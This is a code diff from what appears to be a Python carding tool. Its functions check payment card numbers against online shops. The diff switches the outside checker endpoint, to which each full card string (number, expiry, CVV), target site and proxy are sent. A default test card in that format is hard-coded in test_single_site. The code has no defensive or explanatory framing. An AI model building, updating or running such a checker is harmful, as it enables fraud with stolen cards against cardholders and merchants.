@@ -228,7 +228,7 @@ async def check_card_random_site(card, sites, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={selected_site}'
+        url = f'http://dev-kamal.pw/shopi.php?cc={card}&url={selected_site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
@@ -306,7 +306,7 @@ async def check_card_specific_site(card, site, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={site}'
+        url = f'http://dev-kamal.pw/shopi.php?cc={card}&url={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
@@ -565,7 +565,7 @@ async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_
                 proxy_str = f"{ip}:{port}"
         
         # Use the new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={test_card}&url={site}'
+        url = f'http://dev-kamal.pw/shopi.php?cc={test_card}&url={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         
